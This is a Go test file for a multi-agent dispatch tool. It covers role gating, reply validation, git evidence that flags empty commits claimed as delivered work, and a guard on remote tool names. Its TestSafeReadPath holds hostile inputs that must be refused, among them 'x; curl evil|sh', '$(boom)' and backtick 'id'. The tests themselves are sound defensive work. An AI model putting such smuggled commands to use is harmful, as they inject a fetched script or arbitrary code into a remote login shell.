package main

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/codesweep-ai/campaign/internal/protocol"
)

// fakeHome builds a member's machine: identity, channels, and an open
// dispatch when msg is non-empty.
func fakeHome(t *testing.T, role string, msgNames ...string) (string, *envState) {
	t.Helper()
	home := t.TempDir()
	for _, d := range []string{protocol.InputDir, protocol.RepliesDir, protocol.ConfigDir} {
		if err := os.MkdirAll(filepath.Join(home, d), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	doc := protocol.Member{
		Campaign: "t", Member: "m1name", Role: role,
		Inputs:   []string{"ORIENTATION.md", "brief.md"},
		InputDir: protocol.InputDir, OutputDir: protocol.OutputDir,
		Policy: protocol.DefaultPolicy(),
	}
	b, _ := json.Marshal(doc)
	if err := os.WriteFile(filepath.Join(home, protocol.MemberDoc), b, 0o600); err != nil {
		t.Fatal(err)
	}
	for _, n := range msgNames {
		if err := os.WriteFile(filepath.Join(home, protocol.InputDir, n), []byte("work on "+n), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return home, &envState{Home: home, Member: doc}
}

func TestGate(t *testing.T) {
	_, agent := fakeHome(t, "agent")
	if err := gate(agent, "send"); err == nil || !strings.Contains(err.Error(), "dispatcher verb") {
		t.Fatalf("agent must be refused dispatcher verbs: %v", err)
	}
	_, orch := fakeHome(t, "orchestrator")
	if err := gate(orch, "send"); err == nil || !strings.Contains(err.Error(), "manifest") {
		t.Fatalf("orchestrator without a manifest must be refused with the reason: %v", err)
	}
	orch.Manifest = &protocol.Manifest{}
	if err := gate(orch, "send"); err != nil {
		t.Fatalf("orchestrator with manifest passes: %v", err)
	}
}

func TestReplyLifecycle(t *testing.T) {
	home, env := fakeHome(t, "agent", "d001.md", "d001.001.md")

	// no reply yet: reply closes the dispatch
	if err := cmdReply(env, []string{"--file", writeTmp(t, "did the work")}); err != nil {
		t.Fatalf("reply: %v", err)
	}
	b, err := os.ReadFile(filepath.Join(home, protocol.ReplyPath("d001")))
	if err != nil {
		t.Fatalf("reply file must exist: %v", err)
	}
	r, err := protocol.ParseReply(b)
	if err != nil || r.Dispatch != "d001" || r.Note != "did the work" || r.Phase != "done" {
		t.Fatalf("reply content: %+v %v", r, err)
	}
	// second reply to the same dispatch refuses: it is closed
	if err := cmdReply(env, []string{"--file", writeTmp(t, "again")}); err == nil || !strings.Contains(err.Error(), "already closed") {
		t.Fatalf("closed dispatch must refuse a second reply: %v", err)
	}
	// empty reply refuses
	env2Home, env2 := fakeHome(t, "agent", "d001.md")
	_ = env2Home
	if err := cmdReply(env2, []string{"--file", writeTmp(t, "  \n")}); err == nil || !strings.Contains(err.Error(), "empty") {
		t.Fatalf("empty reply must refuse: %v", err)
	}
	// outcome on a non-mission dispatch refuses
	if err := cmdReply(env2, []string{"--file", writeTmp(t, "x"), "--outcome", "campaign-met"}); err == nil || !strings.Contains(err.Error(), "mission") {
		t.Fatalf("outcome outside the mission must refuse: %v", err)
	}
}

func TestMissionReplyValidation(t *testing.T) {
	_, env := fakeHome(t, "orchestrator", "m1.md")
	if err := cmdReply(env, []string{"--file", writeTmp(t, "verdict")}); err == nil || !strings.Contains(err.Error(), "--outcome") {
		t.Fatalf("mission reply without outcome must refuse: %v", err)
	}
	if err := cmdReply(env, []string{"--file", writeTmp(t, "verdict"), "--outcome", "campaign-blocked"}); err == nil || !strings.Contains(err.Error(), "unmet") {
		t.Fatalf("blocked without unmet must refuse: %v", err)
	}
	if err := cmdReply(env, []string{"--file", writeTmp(t, "verdict"), "--outcome", "campaign-blocked", "--unmet", "api unreachable"}); err != nil {
		t.Fatalf("valid mission reply: %v", err)
	}
}

// TestReplyStampsRepoEvidence proves the co-authored half: the tool measures
// the branch, so "claimed success, committed nothing" arrives pre-refuted.
func TestReplyStampsRepoEvidence(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	home, env := fakeHome(t, "agent", "d001.md")
	repo := filepath.Join(home, "proj")
	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", append([]string{"-C", repo}, args...)...)
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	mustDo(t, os.MkdirAll(repo, 0o755))
	run("init", "-q")
	mustDo(t, os.WriteFile(filepath.Join(repo, "a.txt"), []byte("base\n"), 0o644))
	run("add", ".")
	run("commit", "-qm", "base")
	base, _ := gitOut(repo, "rev-parse", "HEAD")
	env.Member.Repos = []protocol.RepoRef{{Name: "proj", Base: base}}

	// Empty commit: tree identical to base — must stamp false.
	run("commit", "-qm", "empty", "--allow-empty")
	if err := cmdReply(env, []string{"--file", writeTmp(t, "shipped it")}); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(home, protocol.ReplyPath("d001")))
	r, _ := protocol.ParseReply(b)
	if len(r.Repos) != 1 || r.Repos[0].TreeDiffersFromBase {
		t.Fatalf("empty commit must not read as delivered work: %+v", r.Repos)
	}
	// Real change: must stamp true.
	mustDo(t, os.WriteFile(filepath.Join(repo, "a.txt"), []byte("real\n"), 0o644))
	run("add", ".")
	run("commit", "-qm", "real")
	_, env2 := fakeHomeAt(t, home, "agent", "d002.md")
	env2.Member.Repos = env.Member.Repos
	if err := cmdReply(env2, []string{"--file", writeTmp(t, "really shipped")}); err != nil {
		t.Fatal(err)
	}
	b, _ = os.ReadFile(filepath.Join(home, protocol.ReplyPath("d002")))
	r, _ = protocol.ParseReply(b)
	if !r.Repos[0].TreeDiffersFromBase {
		t.Fatalf("a real change must stamp treeDiffersFromBase: %+v", r.Repos)
	}
}

// fakeHomeAt adds a later dispatch to an existing fake home.
func fakeHomeAt(t *testing.T, home, role string, msg string) (string, *envState) {
	t.Helper()
	// mtime ordering: ensure the new dispatch opens later than d001's files.
	p := filepath.Join(home, protocol.InputDir, msg)
	if err := os.WriteFile(p, []byte("more work"), 0o600); err != nil {
		t.Fatal(err)
	}
	later := time.Now().Add(2 * time.Second)
	mustDo(t, os.Chtimes(p, later, later))
	var doc protocol.Member
	b, _ := os.ReadFile(filepath.Join(home, protocol.MemberDoc))
	mustDo(t, json.Unmarshal(b, &doc))
	doc.Role = role
	return home, &envState{Home: home, Member: doc}
}

func TestCheckInputs(t *testing.T) {
	home, env := fakeHome(t, "agent")
	mustDo(t, os.WriteFile(filepath.Join(home, protocol.InputDir, "ORIENTATION.md"), []byte("o"), 0o600))
	// brief.md deliberately absent — cmdCheckInputs prints rather than failing;
	// the printed MISSING line is the readback's `missing` source.
	cmdCheckInputs(env)
}

func TestGuardRefusal(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	realDir := filepath.Join(home, protocol.ChannelsDir, "real")
	mustDo(t, os.MkdirAll(realDir, 0o755))
	mustDo(t, os.WriteFile(filepath.Join(realDir, "cs-codex-remote-output"), []byte("#!/bin/sh\necho real\n"), 0o755))
	m := protocol.Manifest{Agents: map[string]protocol.AgentRecord{
		"dev": {CLI: "opencode", Sandbox: "dev-abc", Session: "camp-dev"},
	}}
	mustDo(t, os.MkdirAll(filepath.Join(home, protocol.ConfigDir), 0o700))
	b, _ := json.Marshal(m)
	mustDo(t, os.WriteFile(filepath.Join(home, protocol.ManifestDoc), b, 0o600))

	// Wrong family against a member's session name: refused with exit 78.
	if code := runGuard("cs-codex-remote-output", []string{"camp-dev", "-s"}); code != guardExitRefused {
		t.Fatalf("wrong family must refuse with %d, got %d", guardExitRefused, code)
	}
	// Missing real tool: broken install, exit 70.
	if code := runGuard("cs-claude-remote", []string{"whatever"}); code != guardExitBroken {
		t.Fatalf("missing real tool must exit %d", guardExitBroken)
	}
}

func writeTmp(t *testing.T, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "body.md")
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

// TestSafeReadPath pins the read verb's injection guard: the path is
// model-supplied and reaches a remote login shell, so it must be inert.
func TestSafeReadPath(t *testing.T) {
	for _, ok := range []string{"replies/d002.json", "SUMMARY.md", "a/b-c_d.txt"} {
		if !safeReadPath(ok) {
			t.Errorf("%q should be allowed", ok)
		}
	}
	for _, bad := range []string{"", "..", "a/../b", "x; curl evil|sh", "$(boom)", "a b", "`id`", "x'y", "x\"y"} {
		if safeReadPath(bad) {
			t.Errorf("%q must be refused", bad)
		}
	}
}

// mustDo fails the test on a setup error. Test scaffolding still has to
// notice when it did not build what the assertion below assumes.
func mustDo(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}
